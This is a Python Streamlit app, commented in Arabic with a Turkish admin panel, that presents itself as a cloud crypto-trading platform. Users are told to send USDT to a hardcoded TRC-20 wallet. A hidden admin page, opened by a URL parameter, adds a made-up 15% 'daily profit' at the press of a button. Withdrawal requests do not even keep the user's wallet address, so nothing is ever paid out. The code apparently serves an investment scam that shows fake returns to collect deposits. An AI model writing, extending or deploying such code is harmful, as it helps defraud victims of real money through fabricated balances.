import streamlit as st

# 1. إعدادات المنصة ومنع الخمول والتجمد
st.set_page_config(page_title="Cloud Platform App", page_icon="☁️", layout="centered")

# تثبيت قاعدة البيانات المشتركة بين الواجهتين
if "db_users" not in st.session_state:
    st.session_state.db_users = {}
if "db_requests" not in st.session_state:
    st.session_state.db_requests = []

# قراءة الرابط السري لمعرفة نوع الزائر
query_params = st.query_params

# 👑 ==================== [ واجهة لوحة التحكم للمشرف ] ====================
if "page" in query_params and query_params["page"] == "admin":
    st.title("👑 Bulut Platformu - Yönetim Kontrol Paneli")
    
    st.metric(label="Kayıtlı Aktif Üye Sayısı Toplamı 👥", value=len(st.session_state.db_users))
    
    if st.button("📊 Doğrudan Günlük Kar Dağıtımı (%15) ⚡"):
        for username in st.session_state.db_users:
            u = st.session_state.db_users[username]
            if u["balance"] > 0:
                p = u["balance"] * 0.15
                u["todayProfit"] += p
                u["balance"] += p
        st.success("📊 %15 Dağıtıldı!")
        st.rerun()

    st.subheader("⚠️ Üyelerin Bekleyen Finansal Talepleri")
    if len(st.session_state.db_requests) == 0:
        st.info("Bekleyen finansal bakiye talebi bulunmamaktadır...")
    else:
        for idx, r in enumerate(st.session_state.db_requests):
            type_text = "📥 Para Yatırma" if r["type"] == "deposit" else "💸 Para Çekme"
            col1, col2, col3, col4 = st.columns(4)
            col1.write(f"👤 {r['username']}")
            col2.write(f"{type_text}")
            col3.write(f"USDT {r['amount']}")
            if col4.button("✅ Onayla", key=f"app_{idx}"):
                username = r["username"]
                if username in st.session_state.db_users:
                    amt = float(r["amount"])
                    if r["type"] == "deposit":
                        st.session_state.db_users[username]["balance"] += amt
                    elif r["type"] == "withdraw_daily":
                        st.session_state.db_users[username]["todayProfit"] -= amt
                st.session_state.db_requests.pop(idx)
                st.success("Talep Onaylandı!")
                st.rerun()

    st.subheader("📊 Üyelerin Bakiyelerinin Canlı Takibi")
    if len(st.session_state.db_users) == 0:
        st.write("Henüz aktif üye yok...")
    else:
        for username, u in st.session_state.db_users.items():
            st.write(f"👤 {username} | Sermaye: USDT {u['balance']:.2f} | Kar: USDT {u['todayProfit']:.2f}")

# 👤 ==================== [ واجهة تداول المستخدمين العالمية ] ====================
else:
    st.title("☁️ منظومة محاكي التداول الذكي والتحليل السحابي")
    
    # قفل وحفظ الاسم
    user_input = st.text_input("👤 اكتب اسمك هنا لبدء البث حياً:", key="user_in")
    if st.button("💾 إرسال طلب حفظ الاسم للمشرف"):
        if user_input.strip():
            username_cleaned = user_input.strip()
            if username_cleaned not in st.session_state.db_users:
                st.session_state.db_users[username_cleaned] = {"username": username_cleaned, "balance": 0.0, "todayProfit": 0.0}
            st.success(f"💾 تم قفل وحفظ الحساب للمستخدم: {username_cleaned}")
            st.rerun()
            
    if user_input.strip() in st.session_state.db_users:
        u = st.session_state.db_users[user_input.strip()]
        st.subheader(f"👤 المستخدم الحالي: {u['username']}")
        
        col1, col2 = st.columns(2)
        col1.metric("إجمالي رأس المال", f"USDT {u['balance']:.2f}")
        col2.metric("الأرباح اليومية", f"USDT {u['todayProfit']:.2f}")
        
        # بوابة الإيداع والشحن
        st.markdown("---")
        st.write("🍏 محفظة الإيداع الرسمية - شبكة USDT (TRC-20)")
        st.code("TA1vsgrJEfy3YM6rkQWbppnZemFE6c9pBN", language="")
        dep_amt = st.number_input("أدخل مبلغ الشحن بـ USDT:", min_value=0.0, step=10.0, key="dep_val")
        if st.button("⚡ إرسال طلب الإيداع للمشرف"):
            if dep_amt > 0:
                st.session_state.db_requests.append({"username": u['username'], "amount": dep_amt, "type": "deposit"})
                st.success("تم إرسال طلب الشحن بنجاح وينتظر موافقة المشرف!")
                st.rerun()
                
        # بوابة السحب الفوري
        st.markdown("---")
        st.write("🚨 بوابة السحب الفوري المباشر (شبكة TRC-20)")
        w_wallet = st.text_input("أدخل عنوان محفظة TRC-20 الخاصة بك:", key="w_wal")
        w_amt = st.number_input("مبلغ سحب أرباح اليوم:", min_value=0.0, step=5.0, key="w_val")
        if st.button("📊 سحب أرباح اليوم"):
            if w_amt > 0 and w_wallet:
                st.session_state.db_requests.append({"username": u['username'], "amount": w_amt, "type": "withdraw_daily"})
                st.success("تم إرسال طلب السحب بنجاح للمشرف وجاري المراجعة!")
                st.rerun()
    
